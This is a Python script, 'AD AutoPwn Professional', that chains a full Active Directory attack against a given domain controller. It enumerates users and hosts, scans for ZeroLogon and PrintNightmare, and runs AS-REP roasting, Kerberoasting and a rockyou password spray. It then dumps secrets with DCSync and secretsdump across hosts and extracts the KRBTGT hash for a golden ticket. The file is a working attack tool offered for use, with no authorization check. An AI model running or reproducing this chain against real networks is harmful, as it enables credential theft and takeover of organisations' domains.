#!/usr/bin/env python3
"""
AD AutoPwn Professional - Complete AD Exploitation Framework
Automatically enumerates targets from provided DC IP
"""
import os
import sys
import re
import subprocess
import json
import argparse
import ldap3
from datetime import datetime

# ASCII Banner
BANNER = r"""
  ___   _____  _       _      _____       _        _      ____  _             
 / _ \ |  _  || |     | |    |  _  |     | |      | |    |  _ \| |_   _ _ __  
/ /_\ \| | | || |     | |    | | | |_ __ | |_ __ _| |_   | |_) | | | | | '_ \ 
|  _  || | | || |     | |    | | | | '_ \| __/ _` | __|  |  __/| | |_| | |_) |
| | | |\ \_/ /| |____ | |____\ \_/ / | | | || (_| | |_   | |   |_|\__,_| .__/ 
\_| |_/ \___/ \_____/ \_____/ \___/|_| |_|\__\__,_|\__|  |_|           |_|    
"""

class ADAutoPwnPro:
    def __init__(self, domain, username, password, dc_ip, output_dir="ad_pentest_results"):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.output_dir = output_dir
        self.findings = []
        self.credentials = []
        self.compromised_hosts = []
        self.discovered_computers = []
        self.discovered_users = []
        
        os.makedirs(self.output_dir, exist_ok=True)
        self.add_credential(username, password, "Initial")
    
    def add_credential(self, username, password, source):
        self.credentials.append({
            "username": username,
            "password": password,
            "source": source,
            "timestamp": datetime.now().isoformat()
        })
    
    def execute_command(self, command, description, critical=False):
        """Execute system command and log results"""
        try:
            print(f"[*] Executing: {description}")
            result = subprocess.run(
                command,
                capture_output=True,
                text=True,
                shell=True
            )
            
            # Save output to file
            cmd_safe = re.sub(r'[^\w]', '_', description)[:50]
            output_path = os.path.join(self.output_dir, f"{cmd_safe}.txt")
            with open(output_path, "w") as f:
                f.write(f"COMMAND: {command}\n\nSTDOUT:\n{result.stdout}\n\nSTDERR:\n{result.stderr}")
            
            if result.returncode == 0:
                print(f"[+] Success: {description}")
                if critical:
                    print(f"[!] CRITICAL SUCCESS: {description}")
                return True, result.stdout
            else:
                print(f"[-] Failed: {description} (code {result.returncode})")
                return False, result.stderr
        except Exception as e:
            print(f"[!] Command execution failed: {str(e)}")
            return False, str(e)
    
    def run_ldap_query(self, query, attributes=["*"]):
        """Execute LDAP query against domain controller"""
        base_dn = ",".join(f"dc={part}" for part in self.domain.split("."))
        try:
            server = ldap3.Server(self.dc_ip, get_info=ldap3.ALL)
            conn = ldap3.Connection(
                server,
                user=f"{self.domain}\\{self.username}",
                password=self.password,
                authentication=ldap3.NTLM,
                auto_bind=True
            )
            conn.search(base_dn, query, attributes=attributes)
            return conn.entries
        except Exception as e:
            print(f"[!] LDAP Error: {str(e)}")
            return []
    
    def enumerate_domain(self):
        """Discover computers and users in the domain"""
        print("[*] Enumerating domain objects...")
        
        # Discover computers
        computers = self.run_ldap_query(
            "(objectClass=computer)",
            ["dNSHostName"]
        )
        self.discovered_computers = [str(c.dNSHostName) for c in computers if hasattr(c, 'dNSHostName')]
        
        # Discover users
        users = self.run_ldap_query(
            "(objectClass=user)",
            ["sAMAccountName"]
        )
        self.discovered_users = [str(u.sAMAccountName) for u in users if hasattr(u, 'sAMAccountName')]
        
        # Save discovered targets
        with open(os.path.join(self.output_dir, "computers.txt"), "w") as f:
            f.write("\n".join(self.discovered_computers))
        
        with open(os.path.join(self.output_dir, "users.txt"), "w") as f:
            f.write("\n".join(self.discovered_users))
        
        print(f"[+] Discovered {len(self.discovered_computers)} computers and {len(self.discovered_users)} users")
    
    # ============== DISCOVERY PHASE ==============
    def discovery_phase(self):
        """Initial reconnaissance focused on the target DC"""
        print("\n[=== DISCOVERY PHASE ===]")
        
        # Enumerate domain first
        self.enumerate_domain()
        
        # Basic DC enumeration
        self.execute_command(
            f"nmap -sV -O -T4 {self.dc_ip}",
            "Nmap scan of Domain Controller"
        )
        
        # AD enumeration
        self.execute_command(
            f"enum4linux -a {self.dc_ip}",
            "enum4linux AD enumeration"
        )
        
        # SMB share enumeration
        self.execute_command(
            f"smbmap -H {self.dc_ip} -u '{self.username}' -p '{self.password}'",
            "SMB share enumeration"
        )
    
    # ============== VULNERABILITY SCAN PHASE ==============
    def vulnerability_scan_phase(self):
        """Identify potential attack vectors on target DC"""
        print("\n[=== VULNERABILITY SCAN PHASE ===]")
        
        # Scan for common vulnerabilities
        self.execute_command(
            f"nmap -p 88,135,139,445,389,636 --script vuln {self.dc_ip}",
            "Common vulnerability scan"
        )
        
        # Check for ZeroLogon
        self.execute_command(
            f"zerologon-scan {self.dc_ip}",
            "ZeroLogon vulnerability check"
        )
        
        # Check for PrintNightmare
        self.execute_command(
            f"nmap -p 445 --script smb-vuln-printnightmare {self.dc_ip}",
            "PrintNightmare vulnerability check"
        )
    
    # ============== EXPLOITATION PHASE ==============
    def exploitation_phase(self):
        """Exploit identified vulnerabilities"""
        print("\n[=== EXPLOITATION PHASE ===]")
        
        # Get discovered users
        users_file = os.path.join(self.output_dir, "users.txt")
        
        # Attempt AS-REP Roasting
        self.execute_command(
            f"GetNPUsers.py -dc-ip {self.dc_ip} {self.domain}/ -usersfile '{users_file}' -format hashcat",
            "AS-REP Roasting attack"
        )
        
        # Attempt Kerberoasting
        self.execute_command(
            f"GetUserSPNs.py -dc-ip {self.dc_ip} {self.domain}/{self.username}:{self.password} -request",
            "Kerberoasting attack"
        )
        
        # Attempt Password Spraying with RockYou
        rockyou_path = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(rockyou_path):
            self.execute_command(
                f"kerbrute passwordspray -d {self.domain} --dc {self.dc_ip} '{users_file}' --passwords '{rockyou_path}'",
                "Password spraying attack with RockYou"
            )
        else:
            print(f"[-] RockYou not found at {rockyou_path}. Skipping password spray.")
    
    # ============== PRIVILEGE ESCALATION PHASE ==============
    def privilege_escalation_phase(self):
        """Gain higher privileges on the DC"""
        print("\n[=== PRIVILEGE ESCALATION PHASE ===]")
        
        # Attempt DCSync
        self.execute_command(
            f"secretsdump.py {self.domain}/{self.username}:{self.password}@{self.dc_ip}",
            "DCSync attempt"
        )
        
        # Attempt to exploit ADCS vulnerabilities
        self.execute_command(
            f"certipy find -u '{self.username}@{self.domain}' -p '{self.password}' -dc-ip {self.dc_ip}",
            "ADCS vulnerability check"
        )
    
    # ============== LATERAL MOVEMENT PHASE ==============
    def lateral_movement_phase(self):
        """Move to other systems in the network"""
        print("\n[=== LATERAL MOVEMENT PHASE ===]")
        
        # Get discovered computers
        if not self.discovered_computers:
            print("[-] No computers discovered. Skipping lateral movement.")
            return
            
        for computer in self.discovered_computers[:5]:  # Limit to 5 for demo
            # Skip DC if it's in the list
            if computer == self.dc_ip or computer.endswith(self.dc_ip):
                continue
                
            # Attempt SMB connection
            success, _ = self.execute_command(
                f"smbclient -L //{computer} -U '{self.domain}/{self.username}%{self.password}'",
                f"SMB connection to {computer}"
            )
            
            if success:
                self.compromised_hosts.append(computer)
                print(f"[+] Compromised host: {computer}")
                
                # Attempt to dump secrets
                self.execute_command(
                    f"secretsdump.py '{self.domain}/{self.username}:{self.password}@{computer}'",
                    f"Secrets dump on {computer}"
                )
    
    # ============== DOMAIN COMPROMISE PHASE ==============
    def domain_compromise_phase(self):
        """Achieve full domain control"""
        print("\n[=== DOMAIN COMPROMISE PHASE ===]")
        
        # Dump NTDS.dit
        success, output = self.execute_command(
            f"secretsdump.py -just-dc {self.domain}/{self.username}:{self.password}@{self.dc_ip}",
            "NTDS.dit dump",
            critical=True
        )
        
        if success:
            # Extract KRBTGT hash
            krbtgt_hash = re.search(r"krbtgt:.*:(.*):", output)
            if krbtgt_hash:
                print(f"[GOLDEN] KRBTGT hash: {krbtgt_hash.group(1)}")
                # Save golden ticket info
                with open(os.path.join(self.output_dir, "golden_ticket.txt"), "w") as f:
                    f.write(f"KRBTGT Hash: {krbtgt_hash.group(1)}\n")
                    f.write(f"Domain: {self.domain}\n")
                    f.write(f"SID: S-1-5-21-... (replace with actual SID)\n")
        
    # ============== MAIN WORKFLOW ==============
    def full_attack_chain(self):
        """Execute complete attack chain against AD environment"""
        print(BANNER)
        print(f"[!] Starting full attack against {self.domain} (DC: {self.dc_ip})")
        
        self.discovery_phase()
        self.vulnerability_scan_phase()
        self.exploitation_phase()
        self.privilege_escalation_phase()
        self.lateral_movement_phase()
        self.domain_compromise_phase()
        
        print("\n[!] Attack chain completed!")
        print(f"[*] Results saved to: {self.output_dir}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AD AutoPwn Professional")
    parser.add_argument("-d", "--domain", required=True, help="Target domain")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-dc", "--dc-ip", required=True, help="Domain Controller IP")
    parser.add_argument("-o", "--output", default="ad_pentest_results", help="Output directory")
    
    args = parser.parse_args()
    
    tool = ADAutoPwnPro(
        args.domain,
        args.username,
        args.password,
        args.dc_ip,
        args.output
    )
    
    tool.full_attack_chain()
